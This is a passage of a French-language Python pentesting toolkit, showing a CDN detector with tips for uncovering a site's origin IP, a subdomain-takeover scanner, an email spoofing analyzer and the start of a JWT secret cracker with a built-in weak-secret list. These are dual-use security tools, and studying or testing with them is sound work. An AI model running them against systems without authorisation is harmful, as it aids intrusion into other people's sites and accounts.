            f.write(f"Date   : {datetime.now().isoformat()}\n")
            f.write("=" * 60 + "\n\n")
            f.write(f"[DOMAINES TROUVES] ({len(all_domains)})\n")
            for d in all_domains:
                f.write(f"  {d}\n")
            f.write("\n[PAR SOURCE]\n")
            for source, domains in results.items():
                f.write(f"\n  {source} ({len(domains)}):\n")
                for d in domains:
                    f.write(f"    {d}\n")
        
        print(f"\n{GREEN}[+] Rapport : {out_file}{RESET}")
    except Exception as e:
        print(f"{YELLOW}[!] Export impossible : {e}{RESET}")

    pause()


# ============================================================
#              OPTION 32 — CDN DETECTOR
# ============================================================

CDN_SIGNATURES = {
    "Cloudflare": {
        "headers": ["cf-ray", "cf-cache-status", "cf-request-id", "cf-connecting-ip"],
        "server": ["cloudflare"],
        "cookies": ["__cfduid", "__cf_bm", "cf_clearance", "_cfuvid"],
        "cname": ["cloudflare.net", "cloudflare.com"],
    },
    "Akamai": {
        "headers": ["x-akamai-transformed", "x-akamai-request-id", "akamai-origin-hop", "x-check-cacheable"],
        "server": ["akamai", "ghost", "akamaighost"],
        "cookies": ["ak_bmsc", "bm_sv", "akamai", "abck", "sbsd"],
        "cname": ["akamaiedge.net", "akamai.net", "akamaitechnologies.com", "edgesuite.net", "edgekey.net"],
    },
    "AWS CloudFront": {
        "headers": ["x-amz-cf-id", "x-amz-cf-pop", "x-amzn-requestid", "x-amz-cf-request-id"],
        "server": ["cloudfront"],
        "cookies": ["awsalb", "awsalbcors", "cloudfront"],
        "cname": ["cloudfront.net"],
    },
    "Fastly": {
        "headers": ["x-fastly-request-id", "fastly-io-info", "x-served-by", "x-cache-hits", "x-timer"],
        "server": ["fastly", "varnish"],
        "cookies": [],
        "cname": ["fastly.net", "fastlylb.net"],
    },
    "Imperva Incapsula": {
        "headers": ["x-iinfo", "x-cdn", "x-cdn-geo"],
        "server": ["incapsula"],
        "cookies": ["incap_ses", "visid_incap", "nlbi", "incap_ses_"],
        "cname": ["incapdns.net", "incapsula.com"],
    },
    "Sucuri": {
        "headers": ["x-sucuri-id", "x-sucuri-cache", "x-sucuri-block"],
        "server": ["sucuri"],
        "cookies": ["sucuri_cloudproxy"],
        "cname": ["sucuri.net", "cloudproxy.net"],
    },
    "MaxCDN / StackPath": {
        "headers": ["x-hw", "x-cache"],
        "server": ["netdna", "maxcdn", "stackpath"],
        "cookies": [],
        "cname": ["netdna-cdn.com", "netdna-ssl.com", "maxcdn.com", "stackpathdns.com"],
    },
    "KeyCDN": {
        "headers": ["x-cache", "server"],
        "server": ["keycdn"],
        "cookies": [],
        "cname": ["kxcdn.com", "keycdn.com"],
    },
    "BunnyCDN": {
        "headers": [],
        "server": ["bunnycdn", "bunny"],
        "cookies": [],
        "cname": ["b-cdn.net", "bunnycdn.com"],
    },
    "Google Cloud CDN": {
        "headers": ["x-goog-generation", "x-goog-hash", "x-goog-stored-content-length"],
        "server": ["gse", "google", "gws"],
        "cookies": [],
        "cname": ["googlehosted.com", "googleusercontent.com", "gstatic.com"],
    },
    "Azure CDN": {
        "headers": ["x-ms-request-id", "x-ms-version", "x-azure-ref"],
        "server": ["windows-azure", "microsoft-azure", "azure"],
        "cookies": [],
        "cname": ["azureedge.net", "azurefd.net", "microsoft.com"],
    },
    "Alibaba Cloud CDN": {
        "headers": ["ali-swift-global-savetime", "x-swift-cachetime", "x-swift-savetime"],
        "server": ["tengine", "alibaba"],
        "cookies": [],
        "cname": ["alicdn.com", "aliyuncs.com"],
    },
    "Baidu CDN": {
        "headers": ["x-bdcdn-cache-status"],
        "server": ["bws", "baidu"],
        "cookies": [],
        "cname": ["bdydns.com", "bdstatic.com"],
    },
    "ChinaCache": {
        "headers": ["x-cache"],
        "server": ["chinacache"],
        "cookies": [],
        "cname": ["chinacache.com", "ccgslb.com"],
    },
    "Highwinds / StackPath": {
        "headers": ["x-hw", "x-cache"],
        "server": ["highwinds", "hwcdn"],
        "cookies": [],
        "cname": ["hwcdn.net", "highwinds.com"],
    },
    "Yottaa": {
        "headers": ["x-yottaa-metrics"],
        "server": ["yottaa"],
        "cookies": [],
        "cname": ["yottaa.net", "yottaa.com"],
    },
    "CacheFly": {
        "headers": ["x-cf1", "x-cf2"],
        "server": ["cachefly"],
        "cookies": [],
        "cname": ["cachefly.net"],
    },
    "CDNetworks": {
        "headers": ["x-cdn"],
        "server": ["cdnetworks", "cdngc"],
        "cookies": [],
        "cname": ["cdngc.net", "cdnetworks.net"],
    },
    "Limelight": {
        "headers": ["x-llnw-request-id"],
        "server": ["limelight", "llnw"],
        "cookies": [],
        "cname": ["llnwd.net", "limelight.com"],
    },
    "Edgio / Edgecast": {
        "headers": ["x-ec-custom-error", "x-ec-debug"],
        "server": ["ecs", "edgecast"],
        "cookies": [],
        "cname": ["edgecastcdn.net", "systemcdn.net", "edgecast.com"],
    },
    "Vercel": {
        "headers": ["x-vercel-cache", "x-vercel-id", "x-vercel-execution-region"],
        "server": ["vercel"],
        "cookies": [],
        "cname": ["vercel.app", "vercel-dns.com"],
    },
    "Netlify": {
        "headers": ["x-nf-request-id"],
        "server": ["netlify"],
        "cookies": [],
        "cname": ["netlify.app", "netlify.com"],
    },
}

def option_32():
    clear()
    banner()
    
    if not _need_requests():
        pause()
        return

    print(f"\n{CYAN}   [ CDN DETECTOR ]{RESET}\n")
    print(f"{GRAY}  Detecte le CDN derriere un site (Cloudflare, Fastly, Akamai...){RESET}\n")

    url = input(f"{YELLOW}[?]{RESET} URL cible (ex: exemple.com) {RED}->{RESET} ").strip()
    if not url:
        print(f"{RED}[!] URL vide.{RESET}")
        pause()
        return

    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    
    domain = urllib.parse.urlparse(url).hostname
    if not domain:
        print(f"{RED}[!] URL invalide.{RESET}")
        pause()
        return

    print(f"\n{CYAN}[*] Analyse de {domain}...{RESET}\n")

    try:
        import urllib3
        urllib3.disable_warnings()
    except Exception:
        pass

    # --- Requête HTTP ---
    try:
        r = requests.get(
            url,
            headers={"User-Agent": "Mozilla/5.0 Chrome/124"},
            timeout=10,
            verify=False,
            allow_redirects=True,
        )
    except Exception as e:
        print(f"{RED}[!] Connexion impossible : {e}{RESET}")
        pause()
        return

    print(f"{GREEN}[+] HTTP {r.status_code}{RESET}")
    print(f"{GRAY}    Server        : {r.headers.get('Server', 'n/a')}{RESET}")
    print(f"{GRAY}    X-Powered-By  : {r.headers.get('X-Powered-By', 'n/a')}{RESET}")
    print(f"{GRAY}    Via           : {r.headers.get('Via', 'n/a')}{RESET}")
    print(f"{GRAY}    X-Cache       : {r.headers.get('X-Cache', 'n/a')}{RESET}")
    if r.cookies:
        print(f"{GRAY}    Cookies       : {', '.join(r.cookies.keys())}{RESET}")
    print()

    # --- Analyse des headers ---
    headers_lower = {k.lower(): v for k, v in r.headers.items()}
    server = headers_lower.get("server", "").lower()
    set_cookie = "; ".join(r.cookies.keys()).lower() if r.cookies else ""

    detected = []
    evidence = {}

    for cdn_name, sigs in CDN_SIGNATURES.items():
        matched = False
        found_signals = []

        # Headers
        for h in sigs["headers"]:
            if h in headers_lower:
                matched = True
                found_signals.append(f"header '{h}: {headers_lower[h][:60]}'")

        # Server
        for s in sigs["server"]:
            if s in server:
                matched = True
                found_signals.append(f"server '{server}'")

        # Cookies
        for c in sigs["cookies"]:
            if c in set_cookie:
                matched = True
                found_signals.append(f"cookie '{c}'")

        if matched:
            detected.append(cdn_name)
            evidence[cdn_name] = found_signals

    # --- Analyse DNS (CNAME) ---
    print(f"{YELLOW}[*] Analyse DNS (CNAME)...{RESET}\n")
    
    try:
        # Résolution DNS
        import subprocess
        
        # Essayer nslookup d'abord (Windows/Linux)
        try:
            result = subprocess.run(
                ["nslookup", "-type=CNAME", domain],
                capture_output=True,
                text=True,
                timeout=8
            )
            dns_output = result.stdout.lower()
        except FileNotFoundError:
            dns_output = ""
        
        # Alternative : requête DoH Google
        if not dns_output and requests:
            try:
                r_dns = requests.get(
                    f"https://dns.google/resolve?name={domain}&type=CNAME",
                    timeout=5,
                )
                if r_dns.status_code == 200:
                    dns_output = str(r_dns.json()).lower()
            except Exception:
                pass
        
        # Chercher les signatures CNAME
        for cdn_name, sigs in CDN_SIGNATURES.items():
            for cname in sigs["cname"]:
                if cname in dns_output:
                    if cdn_name not in detected:
                        detected.append(cdn_name)
                        evidence[cdn_name] = [f"CNAME '{cname}'"]
                    else:
                        evidence[cdn_name].append(f"CNAME '{cname}'")
                    break
        
    except Exception:
        pass

    # --- Résultat final ---
    print(f"\n{CYAN}{BOLD}═══════════════════════════════════════════════════{RESET}")
    print(f"{CYAN}{BOLD}   CDN DETECTION — {domain}{RESET}")
    print(f"{CYAN}{BOLD}═══════════════════════════════════════════════════{RESET}\n")

    if detected:
        print(f"{PINK}{BOLD}   CDN DETECTE ({len(detected)}){RESET}\n")
        for cdn in detected:
            print(f"{PINK}[+]{RESET} {WHITE}{BOLD}{cdn}{RESET}")
            for ev in evidence[cdn]:
                print(f"    {GRAY}└─ {ev}{RESET}")
            print()
        
        print(f"{CYAN}   IMPLICATIONS{RESET}")
        print(f"  {GRAY}→ Les scans directs (port scan, dir brute) peuvent etre bloques{RESET}")
        print(f"  {GRAY}→ Trouve l'IP reelle du serveur via des sous-domaines non proteges{RESET}")
        print(f"  {GRAY}→ Teste les fuites d'IP (mail, ftp, vpn, dev.){RESET}")
        print(f"  {GRAY}→ Pour pentester : cherche l'origine reelle du site{RESET}")
    else:
        print(f"{GREEN}   Aucun CDN identifie.{RESET}\n")
        print(f"{GRAY}  Le serveur semble etre expose directement.{RESET}")
        print(f"{GRAY}  → Un scan direct (nmap, nuclei...) fonctionnera mieux.{RESET}")

    # --- Détection supplémentaire (IP whitelist) ---
    try:
        ip = socket.gethostbyname(domain)
        print(f"\n{CYAN}   IP RÉSOLUE{RESET}")
        print(f"  {GREEN}▸{RESET} {WHITE}{ip}{RESET}")
        
        # Vérifier si l'IP appartient à un CDN connu via ASN
        if requests:
            try:
                r_asn = requests.get(
                    f"https://api.bgpview.io/ip/{ip}",
                    timeout=8,
                    headers={"User-Agent": "Mozilla/5.0 Chrome/124"},
                )
                if r_asn.status_code == 200:
                    data = r_asn.json()
                    if data.get("status") == "ok":
                        prefixes = data.get("data", {}).get("prefixes", [])
                        if prefixes:
                            asn = prefixes[0].get("asn", {})
                            asn_name = asn.get("name", "")
                            asn_desc = asn.get("description", "")
                            print(f"  {GRAY}ASN : {asn_name} ({asn_desc}){RESET}")
                            
                            # Détection via ASN
                            asn_lower = (asn_name + " " + asn_desc).lower()
                            asn_cdn_map = {
                                "cloudflare": "Cloudflare",
                                "akamai": "Akamai",
                                "amazon": "AWS CloudFront",
                                "fastly": "Fastly",
                                "google": "Google Cloud CDN",
                                "microsoft": "Azure CDN",
                                "incapsula": "Imperva",
                                "sucuri": "Sucuri",
                                "stackpath": "StackPath",
                                "alibaba": "Alibaba Cloud CDN",
                                "chinacache": "ChinaCache",
                                "limelight": "Limelight",
                                "vercel": "Vercel",
                                "netlify": "Netlify",
                            }
                            for key, cdn in asn_cdn_map.items():
                                if key in asn_lower and cdn not in detected:
                                    print(f"  {PINK}[+]{RESET} CDN via ASN : {WHITE}{cdn}{RESET}")
                                    break
            except Exception:
                pass
    except Exception:
        pass

    # --- Export ---
    try:
        out_dir = Path(_safe_workdir()) / "Output" / "CDNDetector"
        out_dir.mkdir(parents=True, exist_ok=True)
        safe_domain = re.sub(r"[^\w\-.]", "_", domain)[:60]
        out_file = out_dir / f"cdn_{safe_domain}_{int(time.time())}.txt"
        
        with open(out_file, "w", encoding="utf-8") as f:
            f.write(f"CDN Detection — {domain}\n")
            f.write(f"Date : {datetime.now().isoformat()}\n")
            f.write(f"URL  : {url}\n")
            f.write("=" * 60 + "\n\n")
            f.write(f"[HEADERS]\n")
            for k, v in r.headers.items():
                f.write(f"  {k}: {v}\n")
            f.write(f"\n[CDN DETECTE] ({len(detected)})\n")
            for cdn in detected:
                f.write(f"  {cdn}\n")
                for ev in evidence[cdn]:
                    f.write(f"    - {ev}\n")
        
        print(f"\n{GREEN}[+] Rapport : {out_file}{RESET}")
    except Exception as e:
        print(f"{YELLOW}[!] Export impossible : {e}{RESET}")

    pause()

# ============================================================
#              OPTION 33 — SUBDOMAIN TAKEOVER
# ============================================================

# Signatures des services cloud qui peuvent etre "claim"
TAKEOVER_SIGNATURES = {
    "AWS S3": [
        "The specified bucket does not exist",
        "NoSuchBucket",
        "The specified key does not exist",
    ],
    "GitHub Pages": [
        "There isn't a GitHub Pages site here.",
        "For root URLs (like http://example.com/) you must provide an index.html file",
    ],
    "Heroku": [
        "No such app",
        "heroku | no such app",
    ],
    "Shopify": [
        "Sorry, this shop is currently unavailable.",
    ],
    "Tumblr": [
        "There's nothing here.",
        "Whatever you were looking for doesn't currently exist at this address.",
    ],
    "Fastly": [
        "Fastly error: unknown domain",
    ],
    "Zendesk": [
        "Help Center Closed",
    ],
    "UserVoice": [
        "This UserVoice subdomain is currently available!",
    ],
    "Intercom": [
        "This page is reserved for artistic purposes",
    ],
    "Pantheon": [
        "The gods are wise, but do not know of the site which you seek.",
    ],
    "WordPress": [
        "Do you want to register",
    ],
    "Bitbucket": [
        "Repository not found",
    ],
    "Cargo": [
        "404 Not Found",
        "If you're moving your domain away from Cargo you must make this configuration through your registrar's DNS control panel.",
    ],
    "Unbounce": [
        "The requested URL was not found on this server.",
    ],
    "StatusPage": [
        "You are being redirected",
    ],
}

def option_33():
    clear()
    banner()

    if not _need_requests():
        pause()
        return

    print(f"\n{CYAN}   [ SUBDOMAIN TAKEOVER ]{RESET}\n")
    print(f"{GRAY}  Cherche des sous-domaines vulnerables au takeover.{RESET}")
    print(f"{GRAY}  (S3 buckets supprimes, GitHub Pages orphelines, etc.){RESET}\n")

    target = input(f"{YELLOW}[?]{RESET} Domaine principal (ex: exemple.com) {RED}->{RESET} ").strip()
    if not target:
        print(f"{RED}[!] Domaine vide.{RESET}")
        pause()
        return

    target = target.removeprefix("https://").removeprefix("http://").rstrip("/").split("/")[0]
    if target.startswith("www."):
        target = target[4:]

    # Charger la liste des sous-domaines
    print(f"\n{CYAN}   SOURCE DES SOUS-DOMAINES{RESET}\n")
    print(f"  {PINK}(1){RESET} Fichier local (1 sous-domaine par ligne)")
    print(f"  {PINK}(2){RESET} Decouverte automatique (crt.sh + bruteforce)")
    print()

    src_choice = input(f"{YELLOW}[?]{RESET} Choix (1-2) {RED}->{RESET} ").strip() or "1"

    subdomains = []

    if src_choice == "1":
        file_path = input(f"{YELLOW}[?]{RESET} Chemin du fichier {RED}->{RESET} ").strip().strip('"').strip("'")
        if not os.path.isfile(file_path):
            print(f"{RED}[!] Fichier introuvable.{RESET}")
            pause()
            return
        try:
            with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                subdomains = [ln.strip().lower() for ln in f if ln.strip()]
            print(f"{GREEN}[+] {len(subdomains)} sous-domaines charges{RESET}")
        except Exception as e:
            print(f"{RED}[!] Lecture impossible : {e}{RESET}")
            pause()
            return
    else:
        print(f"{YELLOW}[*] Decouverte via crt.sh...{RESET}")
        try:
            r = requests.get(f"https://crt.sh/?q=%25.{target}&output=json", timeout=20)
            if r.status_code == 200:
                data = r.json()
                subs = set()
                for entry in data:
                    name = entry.get("name_value", "")
                    for n in name.split("\n"):
                        n = n.strip().lower()
                        if n.endswith(target) and "*" not in n and "@" not in n:
                            subs.add(n)
                subdomains = list(subs)
                print(f"{GREEN}[+] crt.sh : {len(subdomains)} sous-domaines{RESET}")
        except Exception as e:
            print(f"{RED}[!] Erreur crt.sh : {e}{RESET}")
            pause()
            return

    if not subdomains:
        print(f"{YELLOW}[!] Aucun sous-domaine a tester.{RESET}")
        pause()
        return

    # Test de takeover
    print(f"\n{YELLOW}[*] Test de {len(subdomains)} sous-domaines...{RESET}\n")

    found = []
    lock = threading.Lock()
    
    def check_subdomain(sub):
        try:
            # Requete HTTP
            url = f"http://{sub}"
            r = requests.get(
                url,
                headers={"User-Agent": "Mozilla/5.0 Chrome/124"},
                timeout=8,
                verify=False,
                allow_redirects=True,
            )
            
            body = (r.text or "")[:5000]
            
            # Test des signatures
            for service, signatures in TAKEOVER_SIGNATURES.items():
                for sig in signatures:
                    if sig.lower() in body.lower():
                        with lock:
                            found.append({
                                "subdomain": sub,
                                "service": service,
                                "signature": sig,
                                "status": r.status_code,
                            })
                            print(f"{PINK}[!]{RESET} {WHITE}{sub}{RESET}")
                            print(f"     {CYAN}{service}{RESET} — {GRAY}{sig}{RESET}")
                        return
            
            # Pas de takeover, afficher discret
            with lock:
                if r.status_code == 404:
                    print(f"{GRAY}[-]{RESET} {sub:<40} {GRAY}404{RESET}")
                elif r.status_code == 200:
                    print(f"{GRAY}[-]{RESET} {sub:<40} {GRAY}200 (pas de takeover){RESET}")
                else:
                    print(f"{GRAY}[-]{RESET} {sub:<40} {GRAY}HTTP {r.status_code}{RESET}")
                    
        except requests.exceptions.ConnectionError:
            with lock:
                print(f"{GRAY}[-]{RESET} {sub:<40} {GRAY}DNS fail{RESET}")
        except Exception:
            pass

    # Lancement en threads
    threads = []
    for sub in subdomains:
        t = threading.Thread(target=check_subdomain, args=(sub,), daemon=True)
        threads.append(t)
        t.start()
        
        # Limiter à 30 threads simultanés
        if len(threads) >= 30:
            for t in threads:
                t.join()
            threads = []

    for t in threads:
        t.join()

    # --- Résultat ---
    print(f"\n\n{CYAN}{BOLD}═══════════════════════════════════════════════════{RESET}")
    print(f"{CYAN}{BOLD}   SUBDOMAIN TAKEOVER — {target}{RESET}")
    print(f"{CYAN}{BOLD}═══════════════════════════════════════════════════{RESET}\n")

    if found:
        print(f"{PINK}{BOLD}   VULNERABLES ({len(found)}){RESET}\n")
        for f in found:
            print(f"{PINK}[+]{RESET} {WHITE}{f['subdomain']}{RESET}")
            print(f"     {GRAY}Service   : {f['service']}{RESET}")
            print(f"     {GRAY}Signature : {f['signature']}{RESET}")
            print(f"     {GRAY}Status    : {f['status']}{RESET}")
            print()
    else:
        print(f"{GREEN}   Aucun sous-domaine vulnerable trouve.{RESET}")

    # --- Export ---
    try:
        out_dir = Path(_safe_workdir()) / "Output" / "SubdomainTakeover"
        out_dir.mkdir(parents=True, exist_ok=True)
        safe_domain = re.sub(r"[^\w\-.]", "_", target)[:60]
        out_file = out_dir / f"takeover_{safe_domain}_{int(time.time())}.txt"
        
        with open(out_file, "w", encoding="utf-8") as f:
            f.write(f"Subdomain Takeover — {target}\n")
            f.write(f"Date : {datetime.now().isoformat()}\n")
            f.write("=" * 60 + "\n\n")
            f.write(f"[VULNERABLES] ({len(found)})\n")
            for f_ in found:
                f.write(f"  {f_['subdomain']}\n")
                f.write(f"    Service : {f_['service']}\n")
                f.write(f"    Signature : {f_['signature']}\n")
                f.write(f"    Status : {f_['status']}\n\n")
        
        print(f"\n{GREEN}[+] Rapport : {out_file}{RESET}")
    except Exception as e:
        print(f"{YELLOW}[!] Export impossible : {e}{RESET}")

    pause()


# ============================================================
#              OPTION 34 — EMAIL HEADER ANALYZER
# ============================================================

def option_34():
    clear()
    banner()

    print(f"\n{CYAN}   [ EMAIL HEADER ANALYZER ]{RESET}\n")
    print(f"{GRAY}  Analyse les headers d'un email (.eml ou texte brut).{RESET}")
    print(f"{GRAY}  Extrait les IP, verifie SPF/DKIM/DMARC, detecte le spoofing.{RESET}\n")

    path = input(f"{YELLOW}[?]{RESET} Chemin du fichier email (ex: mail.eml) {RED}->{RESET} ").strip().strip('"').strip("'")
    if not path or not os.path.isfile(path):
        print(f"{RED}[!] Fichier introuvable.{RESET}")
        pause()
        return

    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
    except Exception as e:
        print(f"{RED}[!] Lecture impossible : {e}{RESET}")
        pause()
        return

    # Separation headers / body
    if "\n\n" in content:
        headers_block, body = content.split("\n\n", 1)
    elif "\r\n\r\n" in content:
        headers_block, body = content.split("\r\n\r\n", 1)
    else:
        headers_block = content
        body = ""

    # Parsing des headers (gestion du multi-ligne)
    headers = {}
    current_key = None
    
    for line in headers_block.splitlines():
        if line.startswith((" ", "\t")) and current_key:
            # Continuation de ligne
            headers[current_key] += " " + line.strip()
        elif ":" in line:
            key, val = line.split(":", 1)
            current_key = key.strip().lower()
            headers[current_key] = val.strip()

    # --- Extraction des infos ---
    print(f"\n{CYAN}{BOLD}═══════════════════════════════════════════════════{RESET}")
    print(f"{CYAN}{BOLD}   EMAIL ANALYSIS — {os.path.basename(path)}{RESET}")
    print(f"{CYAN}{BOLD}═══════════════════════════════════════════════════{RESET}\n")

    # 1. Infos de base
    print(f"{CYAN}{BOLD}   EN-TETES PRINCIPAUX{RESET}")
    
    from_addr = headers.get("from", "Inconnu")
    to_addr = headers.get("to", "Inconnu")
    subject = headers.get("subject", "Inconnu")
    date = headers.get("date", "Inconnu")
    return_path = headers.get("return-path", "Inconnu")
    reply_to = headers.get("reply-to", "Inconnu")
    message_id = headers.get("message-id", "Inconnu")
    
    print(f"  {GREEN}From        : {WHITE}{from_addr}{RESET}")
    print(f"  {GREEN}To          : {WHITE}{to_addr}{RESET}")
    print(f"  {GREEN}Subject     : {WHITE}{subject}{RESET}")
    print(f"  {GREEN}Date        : {WHITE}{date}{RESET}")
    print(f"  {GREEN}Return-Path : {WHITE}{return_path}{RESET}")
    print(f"  {GREEN}Reply-To    : {WHITE}{reply_to}{RESET}")
    print(f"  {GREEN}Message-ID  : {WHITE}{message_id}{RESET}")
    print()

    # 2. Analyse du chemin des serveurs mail (Received)
    print(f"{CYAN}{BOLD}   CHEMIN DES SERVEURS (Received){RESET}\n")
    
    received = headers.get("received", "")
    if received:
        # Splitter si plusieurs Received
        if isinstance(received, str):
            # Gestion multi-ligne avec regex
            received_list = re.findall(r"from\s+([^\s;]+)", received, re.IGNORECASE)
            if received_list:
                for i, rcv in enumerate(received_list):
                    print(f"  {GREEN}[{i+1}]{RESET} {WHITE}{rcv}{RESET}")
            else:
                print(f"  {WHITE}{received[:200]}{RESET}")
    else:
        print(f"  {GRAY}Aucun header Received.{RESET}")
    print()

    # 3. Extraction des IPs
    print(f"{CYAN}{BOLD}   IPs DETECTEES{RESET}\n")
    
    # Regex pour IP
    ip_pattern = r"\b(?:\d{1,3}\.){3}\d{1,3}\b"
    ips = set(re.findall(ip_pattern, content))
    
    # Filtrer les IPs locales / privées
    public_ips = []
    private_ips = []
    
    for ip in ips:
        parts = [int(x) for x in ip.split(".")]
        if (parts[0] == 10 or
            (parts[0] == 172 and 16 <= parts[1] <= 31) or
            (parts[0] == 192 and parts[1] == 168) or
            (parts[0] == 127) or
            (parts[0] == 169 and parts[1] == 254)):
            private_ips.append(ip)
        else:
            public_ips.append(ip)
    
    if public_ips:
        for ip in sorted(public_ips):
            # Tenter une résolution DNS inverse
            try:
                rev = socket.gethostbyaddr(ip)[0]
            except Exception:
                rev = "N/A"
            print(f"  {GREEN}▸{RESET} {WHITE}{ip:<18}{RESET} {GRAY}{rev}{RESET}")
    else:
        print(f"  {GRAY}Aucune IP publique trouvee.{RESET}")
    
    if private_ips:
        print(f"  {GRAY}[i] IPs privees (internes) : {', '.join(private_ips[:5])}{RESET}")
    print()

    # 4. Authentification (SPF, DKIM, DMARC)
    print(f"{CYAN}{BOLD}   AUTHENTIFICATION{RESET}\n")
    
    auth_results = headers.get("authentication-results", "")
    received_spf = headers.get("received-spf", "")
    dkim_sig = headers.get("dkim-signature", "")
    
    spf_status = "Non trouve"
    dkim_status = "Non trouve"
    dmarc_status = "Non trouve"
    
    if received_spf:
        if "pass" in received_spf.lower():
            spf_status = f"{GREEN}PASS{RESET}"
        elif "fail" in received_spf.lower() or "softfail" in received_spf.lower():
            spf_status = f"{RED}FAIL{RESET}"
        elif "neutral" in received_spf.lower():
            spf_status = f"{YELLOW}NEUTRAL{RESET}"
        print(f"  {GREEN}SPF         : {spf_status}{RESET}")
    else:
        print(f"  {GRAY}SPF         : header absent{RESET}")
    
    if dkim_sig:
        if "pass" in auth_results.lower() or "dkim=pass" in auth_results.lower():
            dkim_status = f"{GREEN}PASS{RESET}"
        else:
            dkim_status = f"{YELLOW}Signature presente{RESET}"
        print(f"  {GREEN}DKIM        : {dkim_status}{RESET}")
    else:
        print(f"  {GRAY}DKIM        : pas de signature{RESET}")
    
    if "dmarc=pass" in auth_results.lower():
        dmarc_status = f"{GREEN}PASS{RESET}"
        print(f"  {GREEN}DMARC       : {dmarc_status}{RESET}")
    elif "dmarc=fail" in auth_results.lower():
        dmarc_status = f"{RED}FAIL{RESET}"
        print(f"  {RED}DMARC       : {dmarc_status}{RESET}")
    else:
        print(f"  {GRAY}DMARC       : non specifie{RESET}")
    
    print()

    # 5. Détection de spoofing
    print(f"{CYAN}{BOLD}   DETECTION SPOOFING{RESET}\n")
    
    spoof_indicators = []
    
    # From vs Return-Path
    if from_addr and return_path and from_addr != "Inconnu" and return_path != "Inconnu":
        from_domain = from_addr.split("@")[-1].split(">")[0].strip() if "@" in from_addr else ""
        return_domain = return_path.split("@")[-1].split(">")[0].strip() if "@" in return_path else ""
        if from_domain and return_domain and from_domain.lower() != return_domain.lower():
            spoof_indicators.append(f"From ({from_domain}) != Return-Path ({return_domain})")
    
    # From vs Reply-To
    if reply_to and reply_to != "Inconnu" and from_addr != reply_to:
        reply_domain = reply_to.split("@")[-1].split(">")[0].strip() if "@" in reply_to else ""
        from_domain = from_addr.split("@")[-1].split(">")[0].strip() if "@" in from_addr else ""
        if from_domain and reply_domain and from_domain.lower() != reply_domain.lower():
            spoof_indicators.append(f"From ({from_domain}) != Reply-To ({reply_domain})")
    
    # SPF fail
    if "fail" in received_spf.lower():
        spoof_indicators.append("SPF FAIL (l'email n'est pas envoye par un serveur autorise)")
    
    # Message-ID suspect
    if message_id != "Inconnu" and "@" in message_id:
        msg_domain = message_id.split("@")[-1].split(">")[0].strip()
        from_domain = from_addr.split("@")[-1].split(">")[0].strip() if "@" in from_addr else ""
        if msg_domain and from_domain and msg_domain.lower() != from_domain.lower():
            spoof_indicators.append(f"Message-ID ({msg_domain}) != From ({from_domain})")
    
    if spoof_indicators:
        for ind in spoof_indicators:
            print(f"  {RED}[!]{RESET} {ind}")
    else:
        print(f"  {GREEN}[+]{RESET} Aucun indicateur de spoofing evident.")
    
    print()

    # 6. Body preview
    if body:
        print(f"{CYAN}{BOLD}   BODY (preview){RESET}\n")
        body_clean = body.strip()[:500]
        for line in body_clean.splitlines():
            print(f"  {GRAY}{line}{RESET}")
        print()

    # --- Export ---
    try:
        out_dir = Path(_safe_workdir()) / "Output" / "EmailHeader"
        out_dir.mkdir(parents=True, exist_ok=True)
        safe_name = re.sub(r"[^\w\-.]", "_", os.path.basename(path))[:60]
        out_file = out_dir / f"header_{safe_name}_{int(time.time())}.txt"
        
        with open(out_file, "w", encoding="utf-8") as f:
            f.write(f"Email Header Analysis\n")
            f.write(f"Fichier : {path}\n")
            f.write(f"Date    : {datetime.now().isoformat()}\n")
            f.write("=" * 60 + "\n\n")
            f.write("[EN-TETES]\n")
            for k, v in headers.items():
                f.write(f"  {k}: {v[:200]}\n")
            f.write("\n[IPs PUBLIQUES]\n")
            for ip in public_ips:
                f.write(f"  {ip}\n")
            f.write("\n[SPOOFING INDICATORS]\n")
            for ind in spoof_indicators:
                f.write(f"  [!] {ind}\n")
        
        print(f"{GREEN}[+] Rapport : {out_file}{RESET}")
    except Exception as e:
        print(f"{YELLOW}[!] Export impossible : {e}{RESET}")

    pause()

# ============================================================
#              OPTION 35 — JWT CRACKER
# ============================================================

def option_35():
    clear()
    banner()

    print(f"\n{CYAN}   [ JWT CRACKER ]{RESET}\n")
    print(f"{GRAY}  Analyse un JSON Web Token et tente de casser son secret.{RESET}\n")

    token = input(f"{YELLOW}[?]{RESET} Colle le JWT (ex: eyJhbGci...) {RED}->{RESET} ").strip()
    if not token:
        print(f"{RED}[!] Token vide.{RESET}")
        pause()
        return

    parts = token.split(".")
    if len(parts) != 3:
        print(f"{RED}[!] Format JWT invalide (doit avoir 3 parties).{RESET}")
        pause()
        return

    # 1. Décodage du Header et Payload
    def b64_decode(s):
        s += "=" * ((4 - len(s) % 4) % 4)
        try:
            return base64.urlsafe_b64decode(s).decode("utf-8")
        except Exception:
            return "Erreur de décodage"

    header_b64, payload_b64, signature_b64 = parts
    header_json = b64_decode(header_b64)
    payload_json = b64_decode(payload_b64)

    print(f"\n{CYAN}   HEADER{RESET}")
    try:
        h_data = json.loads(header_json)
        for k, v in h_data.items():
            print(f"  {GREEN}{k:<12} : {WHITE}{v}{RESET}")
        alg = h_data.get("alg", "HS256")
    except Exception:
        print(f"  {GRAY}{header_json}{RESET}")
        alg = "HS256"

    print(f"\n{CYAN}   PAYLOAD{RESET}")
    try:
        p_data = json.loads(payload_json)
        for k, v in p_data.items():
            print(f"  {GREEN}{k:<12} : {WHITE}{v}{RESET}")
    except Exception:
        print(f"  {GRAY}{payload_json}{RESET}")

    # 2. Tentative de crack du secret
    print(f"\n{CYAN}   CRACKING DU SECRET{RESET}\n")
    print(f"{YELLOW}[*] Algorithme détecté : {WHITE}{alg}{RESET}")

    if not alg.startswith("HS"):
        print(f"{RED}[!] Le crack par force brute n'est possible que sur les algorithmes HS (HMAC).{RESET}")
        print(f"{GRAY}    (RS/ES nécessitent une clé privée).{RESET}")
        pause()
        return

    # Wordlist basique intégrée
    common_secrets = [
        "secret", "password", "123456", "admin", "key", "jwt", "token",
        "supersecret", "changeme", "root", "test", "jwtsecret", "mysecret",
        "secretkey", "privatekey", "auth", "apikey", "api_key", "default",
        "jwt_secret", "jwt-secret", "jwtkey", "jwt-key", "bearer",
    ]
    
    wl_path = input(f"\n{YELLOW}[?]{RESET} Wordlist (ENTREE = liste interne) {RED}->{RESET} ").strip()
    if wl_path and os.path.isfile(wl_path):
        try:
